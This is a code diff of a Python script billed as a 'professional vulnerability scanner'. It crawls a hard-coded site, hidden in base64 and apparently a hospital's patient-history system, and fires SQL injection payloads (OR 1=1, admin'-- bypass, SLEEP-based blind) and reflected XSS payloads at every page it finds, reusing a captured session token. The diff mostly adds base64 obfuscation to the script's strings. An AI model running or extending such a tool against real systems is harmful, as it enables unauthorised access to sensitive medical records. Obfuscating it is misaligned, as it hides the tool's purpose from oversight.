@@ -310,12 +310,12 @@ def vulnerability_audit():
     print(f"\n\033[92m" + "="*85)
     print(f" [{time.strftime('%Y-%m-%d %H:%M:%S')}] BLORAHAT PROFESSIONAL VULNERABILITY SCANNER")
     print("="*85 + "\033[0m")
-    
+
     cookies = session.cookies.get_dict()
-    session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or "Not Found"
+    session_id = cookies.get('PHPSESSID') or cookies.get('ci_session') or _decode("Tm90IEZvdW5k")
 
     # Step 1: Discovery URL Internal untuk Target Audit
-    print(f"[*] Mencari target audit di seluruh endpoint internal...")
+    print(f"[*] {_decode('TWVuY2FyaSB0YXJnZXQgYXVkaXQgZGkgc2VsdXJ1aCBlbmRwb2ludCBpbnRlcm5hbC4uLg==')}")
     discovered_urls = []
     try:
         home_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21l")
@@ -323,84 +323,83 @@ def vulnerability_audit():
         s_disc = BeautifulSoup(r_disc.text, 'html.parser')
         for a in s_disc.find_all('a', href=True):
             href = a['href']
-            if "index.php" in href and "logout" not in href.lower() and href.startswith('http'):
+            if _decode("aW5kZXgucGhw") in href and _decode("bG9nb3V0") not in href.lower() and href.startswith('http'):
                 if href not in discovered_urls:
                     discovered_urls.append(href)
     except: pass
-    
+
     if not discovered_urls:
         discovered_urls = [BASE_TARGET_URL + NO_RM]
-    
-    print(f"[*] Inisialisasi Scan  : {ts_init}")
-    print(f"[*] Terdeteksi Target  : {len(discovered_urls)} URL unik")
+
+    print(f"[*] {_decode('SW5pc2lhbGlzYXNpIFNjYW4gIDo=')} {ts_init}")
+    print(f"[*] {_decode('VGVyZGV0ZWtzaSBUYXJnZXQgIDo=')} {len(discovered_urls)} {_decode('VVJMIHVuaWs=')}")
     print(f"[*] Captured Token     : {last_token}")
     print(f"[*] Session ID         : {session_id}")
     print("-" * 85)
 
     findings = []
-    
+
     # 1. SQL Injection Testing
-    print(f"\n[+] Audit Tahap 1: SQL Injection (Multi-Target)")
+    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMTogU1FMIEluamVjdGlvbiAoTXVsdGktVGFyZ2V0KQ==')}")
     sqli_payloads = [
-        ("'", "Error-Based SQLi"),
-        ("' OR 1=1--", "Boolean-Based Bypass"),
-        ("admin'--", "Authentication Bypass"),
-        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", "Time-Based Blind SQLi")
+        ("'", _decode('RXJyb3ItQmFzZWQgU1FMaQ==')),
+        ("' OR 1=1--", _decode('Qm9vbGVhbi1CYXNlZCBCeXBhc3M=')),
+        ("admin'--", _decode('QXV0aGVudGljYXRpb24gQnlwYXNz')),
+        ("' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", _decode('VGltZS1CYXNlZCBCbGluZCBTSUxp'))
     ]
 
     for base_audit_url in discovered_urls:
-        print(f" [*] Testing Target: {base_audit_url[:70]}...")
+        print(f" [*] {_decode('VGVzdGluZyBUYXJnZXQ6')} {base_audit_url[:70]}...")
         for payload, method in sqli_payloads:
             ts = time.strftime("%H:%M:%S")
-            test_url = base_url = base_audit_url + payload
+            test_url = base_audit_url + payload
             try:
                 start_t = time.time()
                 res = session.get(test_url, timeout=10)
                 elapsed = time.time() - start_t
-                
+
                 is_vuln = False
                 if _decode('U0xFRVA=') in payload and elapsed >= 5:
                     is_vuln = True
                 elif any(x in res.text.lower() for x in ["sql syntax", "mysql_fetch", "database error"]):
                     is_vuln = True
-                
+
+                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+                print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
+
                 if is_vuln:
-                    status = "[\033[91mVULNERABLE!\033[0m]"
-                    print(f" [{ts}] Payload: {payload.ljust(45)} {status}")
-                    findings.append({"type": "SQL Injection", "severity": "HIGH", "loc": base_audit_url, "method": method})
-                    break 
+                    findings.append({"type": _decode("U1FMIEluamVjdGlvbg=="), "severity": _decode("SElHSA=="), "loc": base_audit_url, "method": method})
             except:
-                pass
+                print(f" [{ts}] Payload: {payload.ljust(45)} [TIMEOUT/ERROR]")
 
     # 2. XSS Testing
-    print(f"\n[+] Audit Tahap 2: Reflected Cross-Site Scripting (XSS)")
+    print(f"\n[+] {_decode('QXVkaXQgVGFoYXAgMjogUmVmbGVjdGVkIFhTUyAoTXVsdGktVGFyZ2V0KQ==')}")
     xss_payloads = [
-        ("<script>alert(1)</script>", "Basic Script Injection"),
-        ("<svg/onload=alert(1)>", "SVG Animation Injection"),
-        ("\"><script>alert(1)</script>", "Attribute Escape Injection"),
-        ("'-alert(1)-'", "JavaScript Context Injection")
+        ("<script>alert(1)</script>", _decode("QmFzaWMgU2NyaXB0IEluamVjdGlvbg==")),
+        ("<svg/onload=alert(1)>", _decode("U1ZHIEFuaW1hdGlvbiBJbmplY3Rpb24=")),
+        ("\"><script>alert(1)</script>", _decode("QXR0cmlidXRlIEVzY2FwZSBJbmplY3Rpb24=")),
+        ("'-alert(1)-'", _decode("SmF2YVNjcmlwdCBDb250ZXh0IEluamVjdGlvbg=="))
     ]
-    search_url = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jpd2F5YXRfcGVtZXJpa3NhYW4/c2VhcmNoPQ==")
-    
-    for payload in xss_payloads:
-        ts = time.strftime("%H:%M:%S")
-        try:
-            # Gunakan penanganan encoding yang lebih kuat untuk XSS payload
-            encoded_payload = requests.utils.quote(payload)
-            res = session.get(search_url + encoded_payload, timeout=10)
-            
-            # Cek apakah payload terpantul di response body (Gunakan content untuk menghindari error encoding)
-            response_text = res.content.decode('utf-8', errors='ignore')
-            is_vuln = payload in response_text
-            
-            status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
-            print(f" [{ts}] Payload: {payload[:45].ljust(45)} {status}")
-            
-            if is_vuln:
-                findings.append({"type": "Reflected XSS", "severity": "MEDIUM", "loc": "/riwayat_pemeriksaan/search", "method": "Script Reflection"})
-                break
-        except Exception as e:
-            print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR: {str(e)[:20]}]")
+
+    for base_audit_url in discovered_urls:
+        print(f" [*] {_decode('VGVzdGluZyBUYXJnZXQ6')} {base_audit_url[:70]}...")
+        for payload, method in xss_payloads:
+            ts = time.strftime("%H:%M:%S")
+            try:
+                # Testing XSS reflection via automated param 'search' on all targets
+                res = session.get(base_audit_url, params={'search': payload}, timeout=10)
+
+                # Cek apakah payload terpantul di response body
+                response_text = res.content.decode('utf-8', errors='ignore')
+                is_vuln = payload in response_text
+
+                status = "[\033[91mVULNERABLE!\033[0m]" if is_vuln else "[\033[92mSAFE\033[0m]"
+                print(f" [{ts}] Payload: {payload[:45].ljust(45)} {status}")
+
+                if is_vuln:
+                    findings.append({"type": _decode("UmVmbGVjdGVkIFhTUw=="), "severity": _decode("TUVESVVN"), "loc": base_audit_url, "method": method})
+            except:
+                print(f" [{ts}] Payload: {payload[:45].ljust(45)} [ERROR]")
 
     # Tabel Ringkasan (Summary Report)
     print(f"\n" + "-"*85)
